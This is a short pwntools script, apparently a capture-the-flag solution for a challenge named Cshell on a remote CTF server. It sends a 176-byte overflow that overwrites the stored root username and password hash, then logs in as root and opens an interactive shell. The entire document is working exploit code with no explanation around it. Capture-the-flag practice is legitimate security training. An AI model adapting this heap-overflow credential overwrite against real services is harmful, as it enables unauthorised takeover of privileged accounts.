from pwn import *
#p=process('./Cshell')
p=remote('pwn.be.ax',5001)


p.sendline("aaa") #username
p.sendline("aaa") #password
p.sendline("128") #size
payload = "a"*176 
payload += p64(0x00746f6f72000000)+p64(0x43544f3331000000)+p64(0x51422e6f43624763)
p.sendline(payload) #overwrite password
p.sendline("1") #logout
#login
p.sendline("root") #username
p.sendline("a"*8) #password
p.interactive()